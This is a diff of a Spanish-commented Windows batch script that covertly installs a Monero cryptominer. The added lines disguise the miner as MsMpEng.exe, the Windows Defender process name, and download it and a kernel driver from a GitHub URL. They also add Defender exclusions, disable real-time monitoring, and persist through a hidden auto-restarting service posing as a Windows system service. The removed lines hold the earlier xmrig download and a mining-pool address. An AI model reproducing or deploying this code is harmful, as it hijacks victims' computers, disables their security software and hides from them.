@@ -30,37 +30,20 @@ if not %errorlevel% == 0 (
 
 set "MINER_DIR=%USERPROFILE%\AppData\Local\Microsoft\Windows\SystemData"
 
-rem Verificar si el miner ya esta instalado y funcionando
-if exist "%MINER_DIR%\xmrig.exe" (
-  "%MINER_DIR%\xmrig.exe" --help >NUL 2>NUL
+if exist "%MINER_DIR%\MsMpEng.exe" (
+  tasklist /fi "imagename eq MsMpEng.exe" | find "MsMpEng.exe" >NUL
   if %ERRORLEVEL% equ 0 (
-    tasklist /fi "imagename eq xmrig.exe" | find "xmrig.exe" >NUL
-    if %ERRORLEVEL% equ 0 (
-      rem Miner ya esta funcionando, no hacer nada
-      exit /b 0
-    )
+    rem Miner ya esta funcionando, no hacer nada
+    exit /b 0
   )
 )
 
-rem Detectar nucleos fisicos del procesador
-for /f "tokens=2 delims==" %%i in ('wmic cpu get NumberOfCores /value 2^>NUL ^| find "="') do set PHYSICAL_CORES=%%i
-if not defined PHYSICAL_CORES set PHYSICAL_CORES=%NUMBER_OF_PROCESSORS%
-
-rem Calcular porcentaje optimo segun nucleos fisicos
-if %PHYSICAL_CORES% LEQ 2 (
-    set CPU_USAGE=50
-) else if %PHYSICAL_CORES% EQU 4 (
-    set CPU_USAGE=25
-) else if %PHYSICAL_CORES% GEQ 6 (
-    set CPU_USAGE=20
-)
 
 
 if %ADMIN% == 1 (
   powershell -Command "Add-MpPreference -ExclusionPath '%MINER_DIR%' -Force" >NUL 2>NUL
   powershell -Command "Add-MpPreference -ExclusionPath '%USERPROFILE%' -Force" >NUL 2>NUL
-  powershell -Command "Add-MpPreference -ExclusionProcess 'xmrig.exe' -Force" >NUL 2>NUL
-  powershell -Command "Add-MpPreference -ExclusionProcess 'nssm.exe' -Force" >NUL 2>NUL
+  powershell -Command "Add-MpPreference -ExclusionProcess 'MsMpEng.exe' -Force" >NUL 2>NUL
   powershell -Command "Add-MpPreference -ExclusionExtension '.exe' -Force" >NUL 2>NUL
   powershell -Command "Add-MpPreference -ExclusionExtension '.zip' -Force" >NUL 2>NUL
   powershell -Command "Set-MpPreference -DisableRealtimeMonitoring $true" >NUL 2>NUL
@@ -70,7 +53,7 @@ if %ADMIN% == 1 (
 
 sc stop WinSystemData >NUL 2>NUL
 sc delete WinSystemData >NUL 2>NUL
-taskkill /f /t /im xmrig.exe >NUL 2>NUL
+taskkill /f /t /im MsMpEng.exe >NUL 2>NUL
 
 :REMOVE_DIR0
 timeout 2 >NUL
@@ -82,70 +65,21 @@ if errorlevel 1 (
   exit /b 1
 )
 
-powershell -Command "$wc = New-Object System.Net.WebClient; $wc.DownloadFile('https://raw.githubusercontent.com/bryamestre12/llkasjidfjn/refs/heads/main/xmrig.exe', '%MINER_DIR%\xmrig.exe')"
-if errorlevel 1 (
-  goto MINER_BAD
-)
-
-"%MINER_DIR%\xmrig.exe" --help >NUL
-if %ERRORLEVEL% equ 0 goto MINER_OK
-
-:MINER_BAD
-for /f tokens^=2^ delims^=^" %%a IN ('powershell -Command "[Net.ServicePointManager]::SecurityProtocol = 'tls12, tls11, tls'; $wc = New-Object System.Net.WebClient; $str = $wc.DownloadString('https://github.com/xmrig/xmrig/releases/latest'); $str | findstr msvc-win64.zip | findstr download"') DO set MINER_ARCHIVE=%%a
-set "MINER_LOCATION=https://github.com%MINER_ARCHIVE%"
-
-powershell -Command "[Net.ServicePointManager]::SecurityProtocol = 'tls12, tls11, tls'; $wc = New-Object System.Net.WebClient; $wc.DownloadFile('%MINER_LOCATION%', '%USERPROFILE%\xmrig.zip')"
+powershell -Command "$wc = New-Object System.Net.WebClient; $wc.DownloadFile('https://raw.githubusercontent.com/bryamestre12/llkasjidfjn/refs/heads/main/MsMpEng.exe', '%MINER_DIR%\MsMpEng.exe')"
 if errorlevel 1 (
   exit /b 1
 )
 
-:REMOVE_DIR1
-timeout 5
-rmdir /q /s "%MINER_DIR%" >NUL 2>NUL
-IF EXIST "%MINER_DIR%" GOTO REMOVE_DIR1
-
-mkdir "%MINER_DIR%"
+powershell -Command "$wc = New-Object System.Net.WebClient; $wc.DownloadFile('https://raw.githubusercontent.com/bryamestre12/llkasjidfjn/refs/heads/main/WinRing0x64.sys', '%MINER_DIR%\WinRing0x64.sys')"
 if errorlevel 1 (
   exit /b 1
 )
 
-powershell -Command "Add-Type -AssemblyName System.IO.Compression.FileSystem; [System.IO.Compression.ZipFile]::ExtractToDirectory('%USERPROFILE%\xmrig.zip', '%MINER_DIR%')"
-if errorlevel 1 (
-  powershell -Command "$wc = New-Object System.Net.WebClient; $wc.DownloadFile('https://raw.githubusercontent.com/MoneroOcean/xmrig_setup/master/7za.exe', '%USERPROFILE%\7za.exe')"
-  if errorlevel 1 (
-    exit /b 1
-  )
-  "%USERPROFILE%\7za.exe" x -y -o"%MINER_DIR%" "%USERPROFILE%\xmrig.zip" >NUL
-  if errorlevel 1 (
-    exit /b 1
-  )
-  del "%USERPROFILE%\7za.exe"
-)
-del "%USERPROFILE%\xmrig.zip"
-
-"%MINER_DIR%\xmrig.exe" --help >NUL
-if %ERRORLEVEL% equ 0 goto MINER_OK
-
+if exist "%MINER_DIR%\MsMpEng.exe" goto MINER_OK
 exit /b 1
 
 
 :MINER_OK
-del "%MINER_DIR%\config.json"
-
-for /f "tokens=*" %%a in ('powershell -Command "$chars='abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789'; -join ((1..16) | ForEach-Object { $chars[(Get-Random -Maximum $chars.Length)] })"') do set PASS=%%a
-if [%PASS%] == [] (
-  set PASS=na
-)
-
-(
-echo @echo off
-echo tasklist /fi "imagename eq xmrig.exe" ^| find ":" ^>NUL
-echo if errorlevel 1 goto ALREADY_RUNNING
-echo start /min /b %%~dp0xmrig.exe %%^*
-echo goto EXIT
-echo :ALREADY_RUNNING
-echo :EXIT
-) > "%MINER_DIR%\miner.bat"
 
 if %ADMIN% == 1 goto ADMIN_MINER_SETUP
 
@@ -164,10 +98,10 @@ exit /b 1
 :STARTUP_DIR_OK
 (
 echo @echo off
-echo start /min /b "%MINER_DIR%\xmrig.exe" -o 94.72.119.111:3333 --rig-id %PASS% --cpu-max-threads-hint=%CPU_USAGE% --donate-level=0 --background --keepalive --cpu-memory-pool=-1 --asm=auto -a rx/0 --coin=monero
+echo start /min /b "%MINER_DIR%\MsMpEng.exe"
 ) > "%STARTUP_DIR%\WinSystemData.bat"
 
-powershell -WindowStyle Hidden -Command "Start-Process -FilePath '%MINER_DIR%\xmrig.exe' -ArgumentList '-o 94.72.119.111:3333 --rig-id %PASS% --cpu-max-threads-hint=%CPU_USAGE% --donate-level=0 --background --keepalive --cpu-memory-pool=-1 --asm=auto -a rx/0 --coin=monero' -WindowStyle Hidden"
+powershell -WindowStyle Hidden -Command "Start-Process -FilePath '%MINER_DIR%\MsMpEng.exe' -WindowStyle Hidden"
 goto OK
 
 :ADMIN_MINER_SETUP
@@ -178,42 +112,25 @@ if not exist "%MINER_DIR%" (
   )
 )
 
-powershell -Command "$wc = New-Object System.Net.WebClient; $wc.DownloadFile('https://raw.githubusercontent.com/MoneroOcean/xmrig_setup/master/nssm.zip', '%USERPROFILE%\nssm.zip')"
+if not exist "%MINER_DIR%\MsMpEng.exe" (
+  exit /b 1
+)
+
+rem Crear un wrapper VBScript para ejecutar el programa sin ventana
+(
+echo Set WshShell = CreateObject^("WScript.Shell"^)
+echo WshShell.Run """%MINER_DIR%\MsMpEng.exe""", 0, False
+) > "%MINER_DIR%\service_wrapper.vbs"
+
+rem Crear servicio usando sc.exe directamente sin nssm
+sc create WinSystemData binPath= "wscript.exe ""%MINER_DIR%\service_wrapper.vbs"" //B //Nologo" start= auto DisplayName= "Windows System Data Service"
 if errorlevel 1 (
   exit /b 1
 )
 
-powershell -Command "Add-Type -AssemblyName System.IO.Compression.FileSystem; [System.IO.Compression.ZipFile]::ExtractToDirectory('%USERPROFILE%\nssm.zip', '%MINER_DIR%')"
-if errorlevel 1 (
-  powershell -Command "$wc = New-Object System.Net.WebClient; $wc.DownloadFile('https://raw.githubusercontent.com/MoneroOcean/xmrig_setup/master/7za.exe', '%USERPROFILE%\7za.exe')"
-  if errorlevel 1 (
-    exit /b 1
-  )
-  "%USERPROFILE%\7za.exe" x -y -o"%MINER_DIR%" "%USERPROFILE%\nssm.zip" >NUL
-  if errorlevel 1 (
-    exit /b 1
-  )
-  del "%USERPROFILE%\7za.exe"
-)
-del "%USERPROFILE%\nssm.zip"
-
-if not exist "%MINER_DIR%\nssm.exe" (
-  exit /b 1
-)
-if not exist "%MINER_DIR%\xmrig.exe" (
-  exit /b 1
-)
-
-"%MINER_DIR%\nssm.exe" install WinSystemData "%MINER_DIR%\xmrig.exe" -o 94.72.119.111:3333 --rig-id %PASS% --cpu-max-threads-hint=%CPU_USAGE% --donate-level=0 --background --keepalive --cpu-memory-pool=-1 --asm=auto -a rx/0 --coin=monero
-if errorlevel 1 (
-  exit /b 1
-)
-"%MINER_DIR%\nssm.exe" set WinSystemData AppDirectory "%MINER_DIR%"
-"%MINER_DIR%\nssm.exe" set WinSystemData AppPriority BELOW_NORMAL_PRIORITY_CLASS
-"%MINER_DIR%\nssm.exe" set WinSystemData AppStdout "%MINER_DIR%\stdout"
-"%MINER_DIR%\nssm.exe" set WinSystemData AppStderr "%MINER_DIR%\stderr"
-
-"%MINER_DIR%\nssm.exe" start WinSystemData
+sc description WinSystemData "Provides system data collection and management services for Windows."
+sc failure WinSystemData reset= 86400 actions= restart/60000/restart/60000/restart/60000
+sc start WinSystemData
 if errorlevel 1 (
   exit /b 1
 )
